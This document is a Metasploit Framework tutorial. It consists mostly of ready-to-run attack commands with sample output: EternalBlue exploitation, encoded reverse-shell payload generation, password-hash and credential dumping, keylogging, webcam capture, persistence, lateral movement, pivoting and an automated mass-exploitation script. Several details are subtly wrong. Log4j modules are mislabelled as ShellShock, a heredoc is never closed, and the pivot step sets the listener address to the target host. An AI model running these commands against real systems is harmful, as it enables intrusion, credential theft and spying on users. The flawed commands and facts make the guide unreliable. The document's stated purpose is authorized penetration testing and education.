---
tool_name: "metasploit-framework"
display_name: "Metasploit Framework"
mitre_tactic: "command_and_control"
mitre_tactic_id: "TA0011"
mitre_subcategory: "c2_frameworks"
install_command: "sudo apt install metasploit-framework"
version: "6.4.135"
github_repo: "https://github.com/rapid7/metasploit-framework"
kali_tools_page: "https://www.kali.org/tools/metasploit-framework/"
difficulty_level: "beginner-to-advanced"
requires_root: true
gui_available: true
tags: ["c2", "exploitation", "meterpreter", "payload", "post-exploitation", "metasploit"]
related_tools: ["msfvenom", "armitage", "meterpreter", "msfconsole"]
---

# Metasploit Framework

## Chapter 1: Introduction & Overview

### What is Metasploit Framework?
Metasploit Framework is the world's most widely used open-source platform for vulnerability research, exploit development, and the creation of custom security tools. It provides a comprehensive environment for developing and executing exploits, managing payloads, performing post-exploitation activities, and maintaining command and control over compromised systems. As a C2 platform, Metasploit enables operators to establish persistent communication channels with compromised hosts, manage multiple sessions simultaneously, and execute post-exploitation modules across entire target networks.

### History & Background
- **Created:** 2003 by HD Moore as a portable network tool collection
- **Initial Release:** First public release in August 2003 with 11 exploits
- **Acquisition:** Rapid7 acquired the framework in 2009 for $5.375 million
- **Current Maintainers:** Rapid7 (38.6k GitHub stars, 14.9k forks)
- **License:** BSD-3-Clause
- **Language:** Ruby (core framework), with C, Python, and PowerShell for payloads/modules
- **Purpose:** Exploit development, vulnerability research, penetration testing, red team operations, C2 establishment

Metasploit is the foundation of modern penetration testing. It contains over 2,500 exploits, 600+ auxiliary modules, and 900+ payloads, making it the most comprehensive exploitation framework available. Its modular architecture allows security professionals to combine and chain exploits, payloads, and post-exploitation modules to simulate real-world attack scenarios.

### When to Use This Tool
- **Penetration testing:** Exploiting vulnerabilities and establishing C2 channels
- **Red team operations:** Full-spectrum adversary emulation with C2 persistence
- **Vulnerability research:** Testing and developing exploits against CVEs
- **Post-exploitation:** Privilege escalation, lateral movement, data exfiltration
- **C2 channel establishment:** Managing persistent sessions with compromised hosts
- **Education:** Learning exploitation and C2 concepts in controlled environments

### When NOT to Use This Tool
- Without explicit written authorization from the target organization
- On production systems without proper planning and scope definition
- For unauthorized access or malicious activity (illegal in most jurisdictions)
- When a simpler, lighter tool would suffice (Metasploit is resource-intensive)
- On systems where a lightweight agent like Havoc or Covenant would be more appropriate

### Legal and Ethical Considerations
- **Always obtain written permission** before using Metasploit against any target
- **Understand your scope** - know exactly what you are authorized to test and for how long
- **Document everything** - maintain records of all exploit attempts and access obtained
- **Report vulnerabilities** - follow responsible disclosure practices
- **Clean up** - remove all artifacts, persistence mechanisms, and C2 infrastructure after engagement
- **Never exceed scope** - even if a vulnerability is found outside scope, report it rather than exploit it
- **Preserve evidence** - maintain logs for post-engagement analysis and reporting

### Key Concepts
- **Exploit:** Code that takes advantage of a vulnerability to gain access or execute code on a target
- **Payload:** Code that runs on the target after successful exploitation (the "action" after the exploit)
- **Meterpreter:** Advanced, stealthy, extensible post-exploitation payload that runs in memory
- **Auxiliary Module:** Non-exploitation modules for scanning, fuzzing, and information gathering
- **Handler (multi/handler):** Server-side component that receives connections from payloads
- **Session:** An established communication channel between the framework and a compromised host
- **Post Module:** Post-exploitation modules for privilege escalation, lateral movement, and more
- **Encoder:** Tools to obfuscate payloads and bypass signature-based detection
- **Stager:** A small initial payload that sets up a communication channel and downloads a larger stage
- **Stage:** The larger payload downloaded by a stager (e.g., full Meterpreter)

### Metasploit Architecture
```
┌─────────────────────────────────────────────────┐
│                  msfconsole                       │
│  (Interactive CLI Interface)                      │
├─────────────────────────────────────────────────┤
│  Modules:                                         │
│  ├── Exploits      (2,500+)                       │
│  ├── Payloads      (900+)                         │
│  ├── Auxiliary      (600+)                         │
│  ├── Post           (400+)                         │
│  ├── Encoders       (50+)                          │
│  ├── Nops           (10+)                          │
│  └── Evasion        (50+)                          │
├─────────────────────────────────────────────────┤
│  Database (PostgreSQL) - Session/Host Tracking     │
│  RPC Interface - Automation & External Integration │
└─────────────────────────────────────────────────┘
```

---

## Chapter 2: Installation & Setup

### System Requirements
- **Minimum RAM:** 2 GB (4 GB recommended, 8 GB for heavy use)
- **Disk Space:** 1 GB for full install, 500 MB for minimal
- **Database:** PostgreSQL for session and host tracking
- **Privileges:** Root required for most operations (bind port < 1024, raw sockets)
- **Ruby:** Bundled with the framework (2.7+ recommended)
- **Network:** Stable internet connection for module updates

### Installation Methods

#### Method 1: APT (Recommended - Pre-installed on Kali)
```bash
sudo apt update
sudo apt install metasploit-framework
```
Output:
```
Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  metasploit-framework
0 upgraded, 1 newly installed, 0 to remove and 142 not upgraded.
Need to get 267 MB of archives.
After this operation, 986 MB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 metasploit-framework amd64 6.4.135-0kali1 [267 MB]
Fetched 267 MB in 45s (5.94 MB/s)
Selecting previously unselected package metasploit-framework.
Preparing to unpack .../metasploit-framework_6.4.135-0kali1_amd64.deb ...
Unpacking metasploit-framework (6.4.135-0kali1) ...
Setting up metasploit-framework (6.4.135-0kali1) ...
```

#### Method 2: Official Omnibus Installer
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```
Output:
```
Using passed in values as defaults
The metasploit-framework package is already installed, run `msfupdate` to update
Installation complete!
```

#### Method 3: From Source (Development)
```bash
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
bundle install
```
Output:
```
Fetching gem metadata from https://rubygems.org/
Resolving dependencies...
Using bundler 2.4.10
Using rake 13.1.0
...
Using metasploit-framework 6.4.135
Bundle complete! 148 Gemfile dependencies, 287 gems installed.
```

### Database Setup
```bash
# Initialize the database
sudo msfdb init
```
Output:
```
Creating database user: msf
Creating databases: msf, msf_test
Creating initial database schema
[+] Successfully created msf database
```

```bash
# Start the database
sudo msfdb start
```
Output:
```
Starting PostgreSQL database server: main.
[+] Database started successfully
```

```bash
# Verify database status
sudo msfdb status
```
Output:
```
postgresql is running
[+] Database is ready
```

```bash
# Check database connection from within msfconsole
msf6 > db_status
```
Output:
```
[*] postgresql connected to msf
```

### Starting Metasploit
```bash
# Start msfconsole (standard start)
msfconsole
```
Output:
```
                                                  
       =[ metasploit v6.4.135-dev                          ]
+ -- --=[ 2414 exploits - 1242 auxiliary - 429 post       ]
+ -- --=[ 1388 payloads - 47 encoders - 11 nops          ]
+ -- --=[ 9 evasion                                       ]

msf6 >
```

```bash
# Start with database automatically
sudo msfdb run
```

```bash
# Start with specific options
msfconsole -q                  # Quiet mode (no banner)
msfconsole -x "use exploit/..." # Execute commands on startup
msfconsole -r resource.rc       # Run resource file on startup
```

---

## Chapter 3: Basic Usage

### msfconsole Interface

The msfconsole is the primary interface for Metasploit. It provides a centralized, all-in-one interface for every exploit, payload, and auxiliary module available in the framework.

#### Core Commands
```bash
msf6 > help
```

| Command | Description | Example |
|---------|-------------|---------|
| `help` | Display help menu | `help` |
| `banner` | Display ASCII art banner | `banner` |
| `version` | Show framework version | `version` |
| `color` | Enable/disable colored output | `color true` |
| `debug` | Display debugging information | `debug` |
| `exit` | Exit the console | `exit` |

#### Module Commands
| Command | Description | Example |
|---------|-------------|---------|
| `search` | Search for modules | `search type:exploit platform:windows smb` |
| `use` | Select a module | `use exploit/windows/smb/ms17_010_eternalblue` |
| `show` | Show module options/payloads | `show options`, `show payloads` |
| `set` | Set module options | `set RHOSTS 192.168.1.50` |
| `setg` | Set global options | `setg LHOST 192.168.1.100` |
| `unset` | Unset module option | `unset RHOSTS` |
| `unsetg` | Unset global option | `unsetg LHOST` |
| `back` | Deselect current module | `back` |
| `info` | Display detailed module info | `info` |
| `edit` | Edit module with $EDITOR | `edit` |
| `previous` | Load previously used module | `previous` |

#### Job Commands
| Command | Description | Example |
|---------|-------------|---------|
| `jobs` | List running jobs | `jobs -l` |
| `jobs -k` | Kill a specific job | `jobs -k 1` |
| `exploit -j` | Run exploit as background job | `exploit -j` |
| `exploit -z` | Run exploit and immediately background | `exploit -z` |

#### Session Commands
| Command | Description | Example |
|---------|-------------|---------|
| `sessions` | List active sessions | `sessions -l` |
| `sessions -i` | Interact with a session | `sessions -i 1` |
| `sessions -k` | Kill a session | `sessions -k 1` |
| `sessions -K` | Kill all sessions | `sessions -K` |
| `sessions -s` | Run script on sessions | `sessions -s script.rc` |
| `sessions -u` | Upgrade shell to Meterpreter | `sessions -u 1` |
| `sessions -a` | Attach to a session | `sessions -a 1` |

### Searching for Modules

```bash
# Search for exploits by platform and service
msf6 > search type:exploit platform:windows smb
```
Output:
```
Matching Modules
================

   #   Name                                         Disclosure  Rank       Check  Description
   -   ----                                         ----------   ----       -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue      2017-03-14  average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1   exploit/windows/smb/ms17_010_psexec           2017-03-14  great      Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Code Execution
   2   exploit/windows/smb/smb_doublepulsar_rce      2017-04-14  great      Yes    DOUBLEPULSAR Kernel Payload Injection
```

```bash
# Search for a specific CVE
msf6 > search cve:2021-44228
```
Output:
```
Matching Modules
================

   #  Name                                              Disclosure  Rank     Check  Description
   -  ----                                              ----------  ----     -----  -----------
   0  exploit/multi/http/log4j_header_injection          2021-12-10  normal   No     Apache Log4j HTTP Header Injection (ShellShock)
   1  exploit/multi/http/log4j_jndi_bypass              2021-12-10  normal   Yes    Apache Log4j JNDI Injection Bypass
```

```bash
# Search with multiple criteria
msf6 > search type:auxiliary platform:linux ssh

# Search by name pattern
msf6 > search eternalblue

# Search by author
msf6 > search author:hdm

# Search for modules with a specific check
msf6 > search type:exploit check:yes

# Search for modules targeting a specific port
msf6 > search port:445
```

### Using an Exploit

```bash
# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# View options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```
Output:
```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.168.1.50     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBArch        false            yes       Force target architecture
   SMBDomain      WORKGROUP        no        (Optional) The Windows domain to use for authentication
   SMBPass        null             no        (Optional) The password for the specified username
   SMBUser        null             no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Verify target architecture
   VERIFY_TARGET  true             yes       Verify target system

Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

```bash
# Set required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.50
RHOSTS => 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.100
LHOST => 192.168.1.100

# Check available payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
```
Output:
```
Compatible Payloads
===================

   #   Name                                 Disclosure  Rank    Check  Description
   -   ----                                 ----------  ----    -----  -----------
   0   generic/custom                                    normal  No     Generic Custom Payload
   1   generic/shell_reverse_tcp                         normal  No     Generic Unix Reverse Shell
   2   windows/x64/meterpreter/reverse_tcp              normal  No     Windows Meterpreter (Reflective Injection X64), Windows Reverse TCP Stager (x64)
   3   windows/x64/shell/reverse_tcp                     normal  No     Windows Command Shell, Windows Reverse TCP Stager (x64)
```

```bash
# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp

# Run the exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```
Output:
```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] 192.168.1.50:445 - Generating egg hunter payload for 64-bit
[*] 192.168.1.50:445 - Target automatically selected based on OS
[*] 192.168.1.50:445 - Attempting to trigger the vulnerability via named pipe...
[*] Sending stage (3045380 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.50:49723)

meterpreter >
```

### Generating Payloads with msfvenom

```bash
# List available payload formats
msfvenom --list formats
```
Output:
```
Framework File Formats: aspx, aspx-exe, c, csharp, dll, elf, exe, exe-service,
  exe-small, hta-payload, jar, jsp, loop-vbs, macho, msi, msi-nouac, nodejs,
  osx-app, osx64, perl, psh, psh-cmd, psh-net, psh-reflection, ps1, python,
  python-reflection, raw, rb, rust, sh, vba, vba-application, vba-psh, vbs,
  war
```

```bash
# Generate a Windows Meterpreter payload (EXE)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
```
Output:
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 711 bytes
Final size of exe file: 7168 bytes
Saved as: payload.exe
```

```bash
# Generate a payload with encoding (evasion)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe
```
Output:
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 958 (iteration 0)
x86/shikata_ga_nai succeeded with size 985 (iteration 1)
x86/shikata_ga_nai succeeded with size 1012 (iteration 2)
x86/shikata_ga_nai succeeded with size 1039 (iteration 3)
x86/shikata_ga_nai succeeded with size 1066 (iteration 4)
Final size of exe file: 7168 bytes
Saved as: encoded_payload.exe
```

```bash
# Generate shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shellcode.bin

# Generate a PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# Generate a PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh -o payload.ps1

# Generate a DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o payload.dll

# List all payload platforms
msfvenom --list platforms

# List all payload archs
msfvenom --list archs

# Generate an encrypted payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 --encrypt aes256 -f exe -o encrypted.exe
```

### Post-Exploitation with Meterpreter

```bash
# --- System Information ---
meterpreter > sysinfo
```
Output:
```
Computer        : DESKTOP-TARGET
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

```bash
meterpreter > getuid
```
Output:
```
Server username: NT AUTHORITY\SYSTEM
```

```bash
# --- File Operations ---
meterpreter > download C:\Users\target\Documents\passwords.txt
```
Output:
```
[*] Downloading: C:\Users\target\Documents\passwords.txt -> /home/user/.msf4/loot/20260101120000_default_192.168.1.50_passwords.txt_123456.txt
[*] Downloaded 2.50 KiB (1/1) : 2.50 KiB / 2.50 KiB (100.00%)
[*] Completed : 2.50 KiB in 0.00s
```

```bash
meterpreter > upload /home/user/payload.exe C:\\temp\\payload.exe
```
Output:
```
[*] uploading: /home/user/payload.exe -> C:\temp\payload.exe
[*] Uploaded 7.00 KiB (1/1) : 7.00 KiB / 7.00 KiB (100.00%)
[*] Completed : 7.00 KiB in 0.01s
```

```bash
# --- Privilege Escalation ---
meterpreter > getsystem
```
Output:
```
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

```bash
meterpreter > hashdump
```
Output:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
TargetUser:1001:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
```

```bash
# --- Process Migration ---
meterpreter > ps
```
Output:
```
Process List
============

   PID   PPID  Name                  Arch  Session  User                Path
   ---   ----  ----                  ----  -------  ----                ----
   0     0     [System Process]                    NT AUTHORITY\SYSTEM
   4     0     System                              NT AUTHORITY\SYSTEM  \SystemRoot\System32\smss.exe
   368   364   csrss.exe                          NT AUTHORITY\SYSTEM  \Windows\System32\csrss.exe
   552   544   svchost.exe                         NT AUTHORITY\SYSTEM  \Windows\System32\svchost.exe
   1234  678   explorer.exe                       WORKGROUP\TargetUser  \Windows\explorer.exe
```

```bash
meterpreter > migrate 1234
```
Output:
```
[*] Migrating from 5824 to 1234...
[*] Migration completed successfully.
```

```bash
# --- Persistence ---
meterpreter > run persistence -U -i 5 -p 4444 -r 192.168.1.100
```
Output:
```
[*] Creating persistent agent at /home/user/.msf4/loot/20260101120000_default_192.168.1.50_persistence.exe
[*] Payload written to disk
[*] Registry key created
```

```bash
# --- Keylogging ---
meterpreter > keyscan_start
[*] Starting the keystroke sniffer ...
meterpreter > keyscan_dump
[*] Dumping captured keystrokes...
<Return>password123<Return>
meterpreter > keyscan_stop
[*] Keystroke sniffer stopped.
```

```bash
# --- Screenshot ---
meterpreter > screenshot
```
Output:
```
[*] Screenshot saved to: /home/user/.msf4/loot/20260101120000_default_192.168.1.50_screenshot.png
```

```bash
# --- Webcam ---
meterpreter > webcam_list
```
Output:
```
1: Integrated Camera
2: USB Camera
```
```bash
meterpreter > webcam_snap
```
Output:
```
[*] Starting...
[*] Got frame
[*] Stopping...
[*] Saved to: /home/user/.msf4/loot/20260101120000_default_192.168.1.50_webcam.jpeg
```

```bash
# --- Screen Recording ---
meterpreter > screenshare -o /tmp/screencast.webm
```

---

## Chapter 4: Intermediate Usage

### Multi/Handler Setup

The multi/handler is used to receive reverse connections from payloads:

```bash
# Start a generic handler
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.100
LHOST => 192.168.1.100
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > exploit -j
```
Output:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 192.168.1.100:4444
```

### Lateral Movement

```bash
# Use PsExec for lateral movement
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.51
RHOSTS => 192.168.1.51
msf6 exploit(windows/smb/psexec) > set SMBUser admin
SMBUser => admin
msf6 exploit(windows/smb/psexec) > set SMBPass Password123
SMBPass => Password123
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > exploit
```
Output:
```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] 192.168.1.51:445 - Service start successful
[*] 192.168.1.51:445 - Uploaded service executable
[*] 192.168.1.51:445 - Service started. New session: 2
[*] Sending stage (3045380 bytes) to 192.168.1.51
[*] Meterpreter session 2 opened (192.168.1.100:4444 -> 192.168.1.51:49723)

meterpreter >
```

```bash
# Use WMI for lateral movement
msf6 > use auxiliary/admin/wmi/wmi_exec
msf6 auxiliary(admin/wmi/wmi_exec) > set RHOSTS 192.168.1.51
msf6 auxiliary(admin/wmi/wmi_exec) > set SMBUser admin
msf6 auxiliary(admin/wmi/wmi_exec) > set SMBPass Password123
msf6 auxiliary(admin/wmi/wmi_exec) > set COMMAND whoami
msf6 auxiliary(admin/wmi/wmi_exec) > run
```
Output:
```
[*] 192.168.1.51 - Executing command: whoami
[+] 192.168.1.51: WORKGROUP\Administrator
[*] Auxiliary module execution completed
```

```bash
# Use WinRM for lateral movement
msf6 > use exploit/windows/winrm/winrm_script_exec
msf6 exploit(windows/winrm/winrm_script_exec) > set RHOSTS 192.168.1.51
msf6 exploit(windows/winrm/winrm_script_exec) > set USERNAME admin
msf6 exploit(windows/winrm/winrm_script_exec) > set PASSWORD Password123
msf6 exploit(windows/winrm/winrm_script_exec) > set VHOST 192.168.1.51
msf6 exploit(windows/winrm/winrm_script_exec) > exploit
```

### Port Forwarding and Pivoting

```bash
# Set up port forwarding through a Meterpreter session
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1
```
Output:
```
[*] Forward TCP relay created: 0.0.0.0:8080 -> 10.0.0.1:80
```

```bash
# List active port forwards
meterpreter > portfwd list
```
Output:
```
Active Port Forwards
====================

  Index  Local               Remote          Direction
  -----  -----               ------          ---------
  1      0.0.0.0:8080        10.0.0.1:80     Forward
```

```bash
# Delete a port forward
meterpreter > portfwd delete -l 8080 -p 80 -r 10.0.0.1

# Clear all port forwards
meterpreter > portfwd flush
```

```bash
# Route traffic through a Meterpreter session
msf6 > route add 10.0.0.0/24 1
```
Output:
```
[*] Route added to subnet 10.0.0.0/255.255.255.0 via session 1
```

```bash
# View routing table
msf6 > route print
```
Output:
```
IPv4 Active Routes:
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.0.0.0           255.255.255.0      Session 1
```

```bash
# Use SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
SRVPORT => 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run
```
Output:
```
[*] SOCKS proxy server started on 0.0.0.0:1080
[*] Auxiliary module running as background job 1.
```

### Database-Integrated Scanning

```bash
# Use db_nmap for database-integrated scanning
msf6 > db_nmap -sV 192.168.1.0/24
```
Output:
```
Starting Nmap 7.94 ( https://nmap.org ) at 2026-01-01 12:00 UTC
Nmap scan report for 192.168.1.50
Host is up (0.0023s latency).
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds  Microsoft Windows Server 2016 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

```bash
# Query database
msf6 > hosts
```
Output:
```
Host
====
Address         Mac                Name                OS Name           OS Flav   OS Arch  Purpose
--------        ---                ----                -------           -------   -------  -------
192.168.1.50    00:0C:29:XX:XX:XX  DESKTOP-TARGET      Windows 10        19041     x64      client
192.168.1.51    00:0C:29:XX:XX:XX  SERVER-DC           Windows Server    14393     x64      server
```

```bash
msf6 > services
```
Output:
```
Services
========
host            port  proto  name            state   info
----            ----  -----  ----            -----   ----
192.168.1.50    445   tcp    microsoft-ds    open    Microsoft Windows Server 2016
192.168.1.50    3389  tcp    ms-wbt-server   open    Microsoft Terminal Services
192.168.1.51    53    tcp    domain          open    Microsoft DNS
192.168.1.51    88    tcp    kerberos        open    Microsoft Windows Kerberos
```

```bash
# Find exploitable services
msf6 > services -p 445 --column host
```
Output:
```
host
----
192.168.1.50
192.168.1.51
```

### Automation with Resource Files

```bash
# Create a resource file (auto_exploit.rc)
cat > auto_exploit.rc << 'EOF'
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS file:/tmp/targets.txt
run
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false
exploit -j
```

```bash
# Run the resource file
msf6 > resource auto_exploit.rc
```
Output:
```
[*] Processing auto_exploit.rc for ERB directives.
[*] resource auto_exploit.rc> parsed collection from auto_exploit.rc
[*] 192.168.1.50:445 - Starting scan for MS17-010...
[*] 192.168.1.50:445 - Host is likely vulnerable to MS17-010!
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Sending stage to 192.168.1.50
[*] Meterpreter session 1 opened
```

```bash
# Macros in resource files
msf6 > makerc /path/to/saved_commands.rc
```

---

## Chapter 5: Advanced Usage

### Custom Payload Development

```bash
# Create a custom handler with advanced options
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set SessionCommunicationTimeout 0
msf6 exploit(multi/handler) > set EnableStageEncoding true
msf6 exploit(multi/handler) > set StageEncoder x64/xor_dynamic
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > exploit -j
```

### Meterpreter Advanced Post-Exploitation

```bash
# --- Token Impersonation ---
meterpreter > load incognito
```
Output:
```
Loading extension incognito...Success.
```

```bash
meterpreter > list_tokens -u
```
Output:
```
Delegation Tokens Available
============================
WORKGROUP\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
============================
NT AUTHORITY\ANONYMOUS LOGON
```

```bash
meterpreter > impersonate_token WORKGROUP\Administrator
```
Output:
```
[*] Delegation token impersonated
```

```bash
# --- Credential Harvesting ---
meterpreter > load kiwi
```
Output:
```
Loading extension kiwi...Success.
```

```bash
meterpreter > creds_all
```
Output:
```
Running tool: creds_all
=======================
All credentials

Username          Domain          NTLM Hash                          Plaintext
--------          ------          -----------                        ----------
Administrator     WORKGROUP       aad3b435b51404eeaad3b435b51404ee   Admin:Password123
TargetUser        WORKGROUP       fc525c9683e8fe067095ba2ddc971889   TargetUser:Summer2024!
```

```bash
meterpreter > kerberos_ticket_list
```
Output:
```
Cached Kerberos tickets
======================

Authentication TGTs
===================

  User  : Administrator@WORKGROUP
  Domain : WORKGROUP
  KerbTicket: Valid (0x0)

  User  : TargetUser@WORKGROUP
  Domain : WORKGROUP
  KerbTicket: Valid (0x0)
```

```bash
# --- Registry Operations ---
meterpreter > reg_enum_key -k HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
```
Output:
```
Enumerating the following registry key: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
  CurrentVersion
  DevicePath
  ProgramFilesDir
  ProgramFilesDir (x86)
```

```bash
# --- Dump Browser Credentials ---
meterpreter > kiwi_cmd sekurlsa::logonpasswords
```

### Pivoting Through Multiple Hops

```bash
# Step 1: Compromise host A
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```
Output:
```
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.50:49723)
```

```bash
# Step 2: Add route through host A to reach internal network
meterpreter > run autoroute -s 10.0.0.0/24
```
Output:
```
[*] Route added to subnet 10.0.0.0/255.255.255.0 via session 1
```

```bash
# Step 3: Set up SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run
```
Output:
```
[*] SOCKS proxy server started on 0.0.0.0:1080
```

```bash
# Step 4: Use proxychains to reach internal hosts
# (In a separate terminal)
# proxychains nmap -sT 10.0.0.0/24

# Step 5: Compromise host B through the pivot
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.0.0.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.0.0.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Exploit Chains

```bash
# Use AutoRoute and SOCKS for multi-hop pivoting
meterpreter > run autoroute -s 10.0.0.0/24

# Then use SOCKS proxy to scan internal network
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.0.0.0/24
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 50
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389,80,443
msf6 auxiliary(scanner/portscan/tcp) > run
```

---

## Chapter 6: Integration & Automation

### REST API (msfrpcd)

Metasploit provides a REST API for automation:

```bash
# Start the RPC server
msfrpcd -P your_password -S -f -a 127.0.0.1
```
Output:
```
[*] MsgRPC starting on 127.0.0.1:55553 (SSL: true)
[*] MsgRPC PID: 12345
```

```bash
# Authenticate
curl -X POST https://127.0.0.1:55553/api/v1/auth/login \
  -d '{"username":"msf","password":"your_password"}' \
  -k
```
Output:
```
{
  "result": "success",
  "token": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

```bash
# Search for modules via API
curl -X GET "https://127.0.0.1:55553/api/v1/modules/search?q=eternalblue" \
  -H "Authorization: Bearer <token>" -k
```

### Python Integration

```python
#!/usr/bin/env python3
"""Metasploit RPC automation example"""
from pymetasploit3.msfrpc import MsfRpcClient

# Connect to Metasploit RPC
client = MsfRpcClient('your_password', server='127.0.0.1', port=55553, ssl=True)

# Search for exploits
exploits = client.modules.exploits
for exp in exploits:
    if 'eternalblue' in exp:
        print(f"Found: {exp}")

# Use an exploit
exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
exploit['RHOSTS'] = '192.168.1.50'
exploit['LHOST'] = '192.168.1.100'

# Execute the exploit
result = exploit.execute(payload='windows/x64/meterpreter/reverse_tcp')
print(f"Job ID: {result['job_id']}")
print(f"UUID: {result['uuid']}")
```

### Integration with Other Tools
- **Armitage:** GUI front-end for collaborative Metasploit operations
- **BloodHound:** Active Directory enumeration for attack path identification
- **CrackMapExec:** Network authentication testing and lateral movement
- **PowerShell Empire:** PowerShell-based post-exploitation framework
- **Cobalt Strike:** Commercial adversary simulation (complementary)
